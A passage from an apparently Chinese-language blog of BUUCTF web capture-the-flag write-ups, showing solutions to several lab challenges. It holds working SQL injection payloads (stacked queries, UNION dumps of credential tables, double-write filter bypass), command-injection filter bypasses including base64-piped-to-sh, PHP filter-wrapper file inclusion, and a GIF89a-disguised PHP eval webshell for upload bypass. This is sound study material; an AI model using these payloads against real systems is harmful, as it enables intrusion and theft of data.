Flag&quot;;</span><br></pre></td></tr></table></figure><p>用户提交的参数和flag进行了一次或运算后再执行查询,这样无论提交什么非0数字,实际上执行的查询就是:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure><p>返回的结果自然为1</p><img src="/images/buuctf-web/image-20221013194904850.png" alt="image-20221013194904850" style="zoom:67%;" /><p>那么payload设置为: <code>*,1</code>就可以查询到flag,这样实际执行的查询语句是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,1 from Flag; </span><br></pre></td></tr></table></figure><p>另: 可以通过修改SQL配置,将<code>||</code>设置为连接符,当将<code>||</code>视为连接符之后,执行下面的语句将分别查询<code>1</code>和<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1||flag from Flag; </span><br></pre></td></tr></table></figure><p>那么payload为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br><span class="line">实际执行的语句为:</span><br><span class="line">select 1;</span><br><span class="line">set sql_mode=PIPES_AS_CONCAT;</span><br><span class="line">select 1||flag from Flag;</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><img src="/images/buuctf-web/image-20221013203635206.png" alt="image-20221013203635206" style="zoom:67%;" /><p>打开网页只有这么几个字符,可能是提示在url里带上参数<code>ip</code></p><img src="/images/buuctf-web/image-20221013203740321-166704781973310.png" alt="image-20221013203740321" style="zoom:67%;" /><p>那么就用命令注入的思路先尝试一下执行多条命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;ls</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221013203834440-166704781973311.png" alt="image-20221013203834440" style="zoom:67%;" /><p>下面尝试用<code>cat flag.php</code>来读取:</p><img src="/images/buuctf-web/image-20221013203934482-166704781973412.png" alt="image-20221013203934482" style="zoom:67%;" /><p>空格应该是被过滤了…</p><p>那么尝试一些<strong>空格的代替选项:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$IFS、$&#123;IFS&#125;、$IFS$9、%09（在URL上使用较多）、&lt;、&gt;、&lt;&gt;、&#123;,&#125;、%20(space)、%09(tab)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFSflag.php</span><br></pre></td></tr></table></figure><p>结果..</p><img src="/images/buuctf-web/image-20221013204255136-166704781973413.png" alt="image-20221013204255136" style="zoom:67%;" /><p>无奈,看一下另一个文件<code>index.php</code>吧,结果输出了源码,这里可以看到具体过滤了哪些字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样就要考虑绕过方法了</p><ul><li><strong>payload1: 通过<code>base64</code>编码执行命令:</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;echo$IFSY2F0IGZsYWcucGhwCg==|base64$IFS-d|sh</span><br><span class="line">这里实际上执行的命令是:</span><br><span class="line">IFSY2F0IGZsYWcucGhwCg== 是base64编码后的cat flag.php</span><br><span class="line">echo IFSY2F0IGZsYWcucGhwCg== 输出结果作为 base -d的输入,进行解码</span><br><span class="line">然后将上面解码的结果再作为sh的输入,也就是作为命令执行cat flag.php</span><br></pre></td></tr></table></figure><ul><li><strong>payload2:内联执行命令:</strong></li></ul><blockquote><p><strong>反引号再linux中能够使前面的命令执行它内部命令的输出结果,即:</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">cat</span> `<span class="built_in">ls</span>`</span></span><br></pre></td></tr></table></figure><p>若<code>ls</code>的执行结果为111.txt,则上面的命令相当于执行<code>cat 111.txt</code></p></blockquote><p>所以,payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS`ls`</span><br></pre></td></tr></table></figure><ul><li><strong>payload3:变量拼接绕过</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</span><br><span class="line">给变量a赋值&#x27;g&#x27;,然后拼接到最终执行的命令里来绕过过滤.</span><br></pre></td></tr></table></figure><p>flag在源码里:</p><img src="/images/buuctf-web/image-20221013204757970-166704781973414.png" alt="image-20221013204757970" style="zoom:67%;" /><br><hr><br><h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>进去先看源码,发现一个链接:<code>Archive_room.php</code>,进去继续看源码,发现<code>action.php</code></p><p>继续点进去,结果直接跳过<code>action.php</code>到了<code>end.php</code></p><p>这里抓下包看看<code>action.php</code>的响应包:</p><img src="/images/buuctf-web/image-20221013210413117-166704781973415.png" alt="image-20221013210413117" style="zoom:67%;" /><p>访问这个<code>secr3t.php</code>看到源码: 文件包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>那么先尝试包含<code>flag.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=flag.php</span><br></pre></td></tr></table></figure><p>并不在这里</p><img src="/images/buuctf-web/image-20221013211456760.png" alt="image-20221013211456760" style="zoom:67%;" /><p>使用php伪协议读取<code>flag.php</code>的源码,得到flag</p><p>校园网就爆502,热点就可以,这是啥问题……..</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221014161343528-166704781973416.png" alt="image-20221014161343528" style="zoom:67%;" /><br><hr><br><h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>进来先试试万能密码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;#</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221014181006054-166704781973417.png" alt="image-20221014181006054" style="zoom:67%;" /><p>成功登录了,不过这些信息也没什么用</p><p>接下来用<code>union</code>查询来爆一下数据库信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">31cae64d3b82c584b7611bf737473952&#x27; union select version(),database()#</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221014152047891-166704781973418.png" alt="image-20221014152047891" style="zoom:67%;" /><p>出错了,需要添加占位列,不确定位置的话就都尝试一下好了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,version(),database()#</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221014152122462-166704781973419.png" alt="image-20221014152122462" style="zoom:67%;" /><p>成功,说明有结果有三列,后两列会回显.</p><p>那么后面就简单了,接下来爆表名:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,group_concat(TABLE_NAME) from information_schema.tables where table_schema=database() limit 0,1#</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221014180215987-166704781973420.png" alt="image-20221014180215987" style="zoom:67%;" /><p>发现有两个表,名字分别为:<code>geekuser</code>和<code>l0ve1ysq1</code> 显然第二个比较可疑,爆一下列名:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,group_concat(COLUMN_NAME) from information_schema.columns where table_schema=database() and table_name=&#x27;l0ve1ysq1&#x27; limit 0,1#</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221014180511642-166704781973421.png" alt="image-20221014180511642" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(username),group_concat(password) from l0ve1ysq1 limit 0,1#</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221014180852303-166704781973422.png" alt="image-20221014180852303" style="zoom:67%;" /><img src="/images/buuctf-web/image-20221014180904238-166704781973423.png" alt="image-20221014180904238" style="zoom:67%;" /><br><hr><br><h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><p>真就白给shell,根据提示直接POST给<code>Syn</code>这个变量传值执行命令就行了</p><p>扫描一下当前目录并输出,看到一个<code>index.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Syc=print_r(scandir(&quot;.&quot;));</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221014183934877-166704781973424.png" alt="image-20221014183934877" style="zoom:67%;" /><p>输出一下<code>index.php</code>的源码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Syc=show_source(&quot;index.php&quot;);</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221014184051797-166704781973425.png" alt="image-20221014184051797" style="zoom:67%;" /><p>扫一下根目录,发现有个名为flag的文件,通过系统命令输出其内容就看到了flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Syc=print_r(scandir(&quot;/&quot;));</span><br><span class="line">Syc=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221014184350220-166704781973426.png" alt="image-20221014184350220" style="zoom:67%;" /><p>这题也可以拿菜刀之类的软件连一下<code>Syn</code>这个变量,找得会更快.</p><br><hr><br><h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>在源码里能找到<code>Secret.php</code>,访问之:</p><img src="/images/buuctf-web/image-20221014185328220-166704781973427.png" alt="image-20221014185328220" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">It doesn&#x27;t come from &#x27;https://Sycsecret.buuoj.cn&#x27;</span><br></pre></td></tr></table></figure><p>这里根据提示,可以在请求中添加<code>Referer</code>头字段,这个字段用于告知服务器用户是从哪个字段来的:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://Sycsecret.buuoj.cn</span><br></pre></td></tr></table></figure><p>发送请求后又提示,请使用<code>Syclover</code>浏览器,那么修改<code>User-Agent</code>字段就行:</p><img src="/images/buuctf-web/image-20221014190838466-166704781973428.png" alt="image-20221014190838466" style="zoom:67%;" /><p>直接在划线处用<code>Syclover</code>替换了<code>Firefox</code></p><p>发送请求后提示:「No!!! you can only read this locally!!!」</p><p>那么需要添加<code>X-Forwarded-For(XFF)</code>头: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221014191033879.png" alt="image-20221014191033879" style="zoom:80%;" /><p>拿到flag</p><img src="/images/buuctf-web/image-20221014190605829-166704781973429.png" alt="image-20221014190605829" style="zoom:67%;" /><br><hr><br><h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>提示要求上传图片,那么如果要传一句话木马的话肯定得绕过图片检测</p><p>简单改文件扩展名不管用,应该是使用了<code>getimagesize</code>这样的函数对文件内容进行了检测</p><img src="/images/buuctf-web/image-20221014210751046-166704781973431.png" alt="image-20221014210751046" style="zoom:67%;" /><p>另外,文件内容中包含<code>?&gt;</code>这样的符号也会被检测出来</p><img src="/images/buuctf-web/image-20221014211253339-166704781973430.png" alt="image-20221014211253339" style="zoom:67%;" /><p>因此在编写一句话木马时也需要做一些绕过措施</p><blockquote><p>补充知识点: <strong>GIF89a头文件欺骗</strong></p><p>假如某个文件的内容为:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;GIF89a</span><br><span class="line">&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>($_POST[<span class="string">&#x27;a&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>后台在读取文件内容时会认为此文件为图片,这样能够骗过<code>getimagesize</code>的检测</strong></p></blockquote><p>如此以来,搞定了文件内容,就可以看一看哪些文件扩展名能够上传成功了</p><p>尝试一下<code>phtml</code>,<code>pht</code>,<code>php3</code>,<code>php4</code>,<code>php5</code>等,这些扩展名都能够被服务器当作<code>php</code>来执行</p><img src="/images/buuctf-web/image-20221014210547256-166704781973432.png" alt="image-20221014210547256" style="zoom:67%;" /><p>另外,直接文件扩展名改为<code>gif</code>也能够上传成功</p><p>用菜刀尝试连一下<code>http://d6e4d513-4501-430a-8cff-023311e288e1.node4.buuoj.cn:81/112.phtml</code>报404,说明上传文件不存放在这个目录, 尝试一下<code>http://d6e4d513-4501-430a-8cff-023311e288e1.node4.buuoj.cn:81/upload</code>这个目录,竟然猜中了:</p><img src="/images/buuctf-web/image-20221014212101985-166704781973433.png" alt="image-20221014212101985" style="zoom:67%;" /><p>这样用菜刀连上就好了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://d6e4d513-4501-430a-8cff-023311e288e1.node4.buuoj.cn:81/upload/112.phtml</span><br></pre></td></tr></table></figure><p>在根目录里找到了flag</p><p>另外还找到了检测上传文件脚本的源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 允许上传的图片后缀</span></span><br><span class="line"><span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;phtm&quot;</span>); <span class="comment">//过滤php文件,这里漏了phtml</span></span><br><span class="line"><span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="variable">$extension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>));        <span class="comment">// 获取文件后缀名</span></span><br><span class="line"><span class="variable">$image_type</span> = @<span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]); <span class="comment">//获取图片exif信息,也就根据内容检测了文件是否为图片</span></span><br><span class="line"><span class="keyword">if</span> (((<span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/gif&quot;</span>)</span><br><span class="line">|| (<span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/x-png&quot;</span>)</span><br><span class="line">|| (<span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>)) <span class="comment">//允许的文件格式</span></span><br><span class="line">&amp;&amp;<span class="variable">$file</span>[<span class="string">&quot;size&quot;</span>] &lt; <span class="number">20480</span>)    <span class="comment">// 小于 20 kb //限制上传文件的大小</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ERROR!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NOT！&quot;</span>.<span class="variable">$extension</span>.<span class="string">&quot;!&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">elseif</span> (<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NO! HACKER! your file included &#x27;&amp;#x3C;&amp;#x3F;&#x27;&quot;</span>;</span><br><span class="line">    &#125; <span class="comment">//检测文件内容中是否有非法字符</span></span><br><span class="line">    <span class="keyword">elseif</span> (!<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t lie to me, it&#x27;s not image at all!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$fileName</span>=<span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$fileName</span>); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;上传文件名: &quot;</span> . <span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Not image!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><hr><br><h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p>还是上传文件,要求只上传jpg,png,gif格式的</p><p>如果上传了其他格式的,直接就会在前端弹窗,弹窗时都没有抓到包,这里的检测应该发生在前端</p><img src="/images/buuctf-web/image-20221014215427308-166704781973435.png" alt="image-20221014215427308" style="zoom: 67%;" /><img src="/images/buuctf-web/image-20221014214036126.png" alt="image-20221014214036126" style="zoom:67%;" /><p>那么可以先上传后缀名符合要求的<code>jpg,png,gif</code>图片,然后修改包中的文件后缀名为<code>phtml</code>(经过尝试,<code>php</code>会被后端过滤出来,尝试了一圈还是只能用<code>phtml</code>)</p><img src="/images/buuctf-web/image-20221014214913199-166704781973434.png" alt="image-20221014214913199" style="zoom:67%;" /><p>上传成功,这里还很贴心地给了路径,那么使用菜刀连接就能找到flag了.</p><img src="/images/buuctf-web/image-20221014214944504-166704781973436.png" alt="image-20221014214944504" style="zoom:67%;" /><img src="/images/buuctf-web/image-20221014215043655-166704781973437.png" alt="image-20221014215043655" style="zoom:67%;" /><br><hr><br><h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>万能密码不能用了</p><p><img src="/image/buuctf-web/image-20221014222541901.png" alt="image-20221014222541901"><img src="/images/buuctf-web/image-20221014222541901.png" alt="image-20221014222541901" style="zoom:67%;" /><img src="/images/buuctf-web/image-20221014222258099-166704781973438.png" alt="image-20221014222258099" style="zoom:67%;" /></p><p>但是密码框直接输入<code>1&#39;</code>会报错,说明还是存在注入漏洞</p><img src="/images/buuctf-web/image-20221014222358093-166704781973439.png" alt="image-20221014222358093" style="zoom:67%;" /><p>尝试<code>union select</code>,依然报错,根据前面输入<code>1&#39;</code>和<code>1&#39; or &#39;1&#39;=&#39;1&#39;#</code>的对比,这里应该是存在关键词过滤</p><p>这里对<code>or</code>尝试一下双写绕过: 成功,果然如此</p><p><img src="/images/buuctf-web/image-20221014222633460-166704781973440.png" alt="image-20221014222633460" style="zoom:67%;" /><img src="/images/buuctf-web/image-20221014222649635.png" alt="image-20221014222649635" style="zoom:67%;" /></p><p>那么对<code>union</code>和<code>select</code>使用同样的方法来绕过:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion seselectlect 1,2,group_concat(TABLE_NAME) frfromom information_schema.tables whwhereere table_schema=database()#</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221014221556384.png" alt="image-20221014221556384" style="zoom:67%;" /><p>这里<code>imformation</code>中的<code>or</code>也被过滤了…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion seselectlect 1,2,group_concat(TABLE_NAME) frfromom infoorrmation_schema.tables whwhereere table_schema=database()#</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221014221726604-166704781973442.png" alt="image-20221014221726604" style="zoom:67%;" /><p>后面用常规方法一步一步找到flag就好了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion seselectlect 1,2,group_concat(COLUMN_NAME) frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name=&#x27;b4bsql&#x27;#</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221014221925750-166704781973443.png" alt="image-20221014221925750" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion seselectlect 